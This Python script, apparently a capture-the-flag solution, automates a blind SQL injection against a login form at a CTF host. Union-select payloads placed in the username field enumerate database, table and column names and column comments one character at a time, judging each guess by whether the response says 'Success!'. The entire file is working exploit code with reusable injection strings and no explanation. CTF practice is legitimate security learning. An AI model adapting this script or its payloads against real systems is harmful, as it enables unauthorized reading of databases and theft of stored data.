import requests, string

url = "http://ctf.adl.tw:12006/sw-login"


def db(offset):
    username = "' union select 1,2,schema_name from (select 1,2,schema_name from information_schema.schemata limit 1 offset {}) AS t where substr(schema_name,{},1) = \"{}\";#"
    password = "1234"
    db_name = ""
    tmp = ""

    for i in range(1,51):
        print("progress : " + str(i) + " / 50")
        for c in string.printable:
            r = requests.post(url, data = {"ctf_username" : username.format(str(offset), str(i), c), "ctf_password" : password})
            if "Success!" in r.text:
                if c in string.printable[:94]:
                    db_name += c
                    break
        print("database name = " + db_name)
        if i > 3 and tmp == db_name:
            return db_name
        tmp = db_name

def crawl_db(idx_start, idx_end):
    dbs = ""
    for i in range(idx_start, idx_end):
        dbs += db(i) + ", "
        print("databases : " + dbs)


def table(offset):
    username = "' union select 1,2,table_name from (select 1,2,table_name from information_schema.tables where table_schema = \"information_schema\" limit 1 offset {}) AS t where substr(table_name,{},1) = \"{}\";#"
    password = "1234"
    table_name = ""
    tmp = ""

    for i in range(1,51):
        print("progress : " + str(i) + " / 50")
        for c in string.printable:
            r = requests.post(url, data = {"ctf_username" : username.format(str(offset), str(i), c), "ctf_password" : password})
            if "Success!" in r.text:
                if c in string.printable[:94]:
                    table_name += c
                    break
        print("table name = " + table_name)
        if i > 3 and tmp == table_name:
            return table_name
        tmp = table_name

def crawl_table(idx_start, idx_end):
    tables = ""
    for i in range(idx_start, idx_end):
        tables += table(i) + ", "
        print("tables : " + tables)


def column(offset):
    username = "' union select 1,2,column_name from (select 1,2,column_name from information_schema.columns where table_schema = \"information_schema\" and table_name = \"columns\" limit 1 offset {}) AS t where substr(column_name,{},1) = \"{}\";#"
    password = "1234"
    column_name = ""
    tmp = ""

    for i in range(1,51):
        print("progress : " + str(i) + " / 50")
        for c in string.printable:
            r = requests.post(url, data = {"ctf_username" : username.format(str(offset), str(i), c), "ctf_password" : password})
            if "Success!" in r.text:
                if c in string.printable[:94]:
                    column_name += c
                    break
        print("column name = " + column_name)
        if i > 3 and tmp == column_name:
            return column_name
        tmp = column_name

def crawl_column(idx_start, idx_end):
    columns = ""
    for i in range(idx_start, idx_end):
        columns += column(i) + ", "
        print("columns : " + columns)


def value(offset):
    username = "' union select 1,2,column_comment from (select 1,2,column_comment from information_schema.columns where table_schema = \"blog\" limit 1 offset {}) AS t where substr(column_comment,{},1) = \"{}\";#"
    password = "1234"
    value = ""
    tmp = ""

    for i in range(1,51):
        print("progress : " + str(i) + " / 50")
        for c in string.printable:
            r = requests.post(url, data = {"ctf_username" : username.format(str(offset), str(i), c), "ctf_password" : password})
            if "Success!" in r.text:
                if c in string.printable[:94] or c == " ":
                    value += c
                    break
        print("value = " + value)
        if i > 3 and tmp == value:
            return value
        tmp = value

    return value

def crawl_value(idx_start, idx_end):
    values = ""
    for i in range(idx_start, idx_end):
        values += value(i) + ", "
        print("values : " + values)

    

def main():
    choice = int(input("1.db  2.table  3.column  4.value  : "))
    assert(1 <= choice <= 4)
    if choice == 1:
        crawl_db(0, 30)
    elif choice == 2:
        crawl_table(0, 30)
    elif choice == 3:
        crawl_column(0, 30)
    elif choice == 4:
        crawl_value(5, 30)


if __name__ == "__main__":
    main()